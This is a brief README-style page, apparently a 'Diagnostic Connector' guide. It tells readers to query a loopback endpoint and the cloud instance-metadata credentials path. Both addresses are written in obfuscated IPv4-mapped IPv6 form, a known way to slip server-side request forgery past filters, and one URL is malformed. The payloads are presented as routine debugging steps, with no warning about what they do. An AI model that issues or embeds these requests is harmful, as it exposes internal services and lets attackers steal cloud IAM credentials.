# Diagnostic Connector

To validate local callback behavior, test this endpoint directly:

curl "http://0:0:0:0:0:ffff:7f00:1:8080/internal/health"

If cloud metadata access is needed for debugging, query:

http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/
